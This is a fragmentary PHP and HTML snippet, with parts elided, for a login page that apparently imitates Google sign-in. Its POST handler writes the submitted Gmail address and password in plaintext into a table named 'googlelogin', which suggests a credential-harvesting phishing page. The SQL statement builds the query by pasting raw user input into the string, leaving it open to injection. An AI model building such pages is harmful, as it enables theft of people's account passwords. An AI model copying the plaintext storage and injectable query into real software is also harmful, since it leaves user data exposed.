<?php
    ...
    if(isset($_POST['submit'])) {
        ...
        $insert_query = "INSERT INTO googlelogin (userGmail, userPassword) VALUES ('$username', '$password')";
...
<body>
    ...
    <div class="login-container">
        <form class="login-form" action="" method="post">
            ...
            <button type="button" class="google-button" onclick="redirectToCreateAccount()">Create an Account</button>
